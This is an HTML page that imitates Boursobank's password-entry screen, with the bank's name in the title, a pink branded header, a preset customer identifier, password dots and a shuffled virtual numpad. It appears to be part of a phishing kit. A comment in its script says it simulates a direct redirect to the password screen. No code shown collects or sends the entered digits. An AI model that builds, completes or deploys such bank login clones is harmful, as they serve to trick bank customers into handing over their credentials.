<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mot de Passe - Boursobank</title>
    <style>
        /* Corps général */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f3f4fc, #eef4fc);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        /* Conteneur principal */
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        /* Logo principal */
        .top-logo {
            margin-bottom: 70px;
            width: 100%;
            height: 20%;
        }

        .top-logo img {
            max-width: 200px;
        }

        /* Formulaire */
        .form-box {
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 500px;
            overflow: hidden;
            position: relative;
        }

        /* Bande rose */
        .header-bar {
            background: linear-gradient(to right, #d9007f, #ff007a);
            height: 10px;
            border-top-left-radius: 10px;
            border-top-right-radius: 10px;
        }

        /* Contenu du formulaire */
        .form-content {
            padding: 30px;
        }

        /* Logo secondaire */
        .form-logo img {
            max-width: 50px;
            margin-bottom: 15px;
        }

        /* Titre principal */
        h1 {
            font-weight: 500;
            color: #003883;
            font-size: 1.3rem;
            margin-bottom: 10px;
        }

        /* Texte de vérification */
        .verification-text {
            font-size: 0.7rem;
            margin-bottom: 5px;
            color: #667e9b !important;
        }

        .verification-box {
            color: #27ae60;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }

        /* Champs ronds pour mot de passe */
        .password-dots {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 20px;
        }

        .password-dots div {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            background: #d1d1d1;
        }

        /* Boutons du clavier */
        .numpad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 20px 0;
        }

        .numpad button {
            background: #ffffff;
            border: 1px solid #c0c0c0;
            border-radius: 50%;
            width: 70px;
            height: 70px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }

        .numpad button:hover {
            background: #f0f0f0;
        }

        /* Bouton principal */
        .btn {
            background: #ff006f;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
            width: 100%;
        }

        .btn:hover {
            background: #e60064b1;
        }

        /* Footer */
        .footer-links {
            margin-top: 20px;
            font-size: 0.8rem;
            color: #999;
        }

        .footer-links a {
            color: #999;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body onload="loadPasswordScreen()">
    <div class="container">
        <!-- Logo principal -->
        <div class="top-logo">
            <img src="rvb-logo-3000_original_original-1024x188.png" alt="Logo Principal">
        </div>

        <!-- Boîte du formulaire -->
        <div class="form-box">
            <!-- Bande rose -->
            <div class="header-bar"></div>

            <!-- Contenu du formulaire -->
            <div class="form-content" id="formContent">
                <!-- Logo secondaire -->
                <div class="form-logo">
                    <img src="instruments-logo-4677.png" alt="Logo Secondaire">
                </div>

                <!-- Titre -->
                <h1>Mon mot de passe</h1>

                <!-- Identifiant affiché -->
                <div id="userIdentifier" style="font-size: 1.2rem; margin-bottom: 10px;">454545</div>

                <!-- Champs ronds -->
                <div class="password-dots" id="passwordDots">
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                </div>

                <!-- Numpad -->
                <div class="numpad">
                    <button>5<br><small>JKL</small></button>
                    <button>6<br><small>MNO</small></button>
                    <button>3<br><small>DEF</small></button>
                    <button>1<br><small>GHI</small></button>
                    <button>4<br><small>ABC</small></button>
                    <button>0<br></button>
                    <button>8<br><small>TUV</small></button>
                    <button>7<br><small>PQRS</small></button>
                    <button>9<br><small>WXYZ</small></button>
                    <button>2<br><small>ABC</small></button>
                </div>

                <!-- Bouton -->
                <button class="btn">Je me connecte</button>
            </div>
        </div>

        <!-- Liens de bas de page -->
        <div class="footer-links">
            <a href="#">Aide</a> / <a href="#">Opposition</a> / <a href="#">Sécurité</a>
        </div>
    </div>

    <script>
        function loadPasswordScreen() {
            // Simuler une redirection directe sur l'écran "Mot de passe".
            const formContent = document.getElementById('formContent');
            formContent.style.display = 'block';
        }
    </script>
</body>
</html>
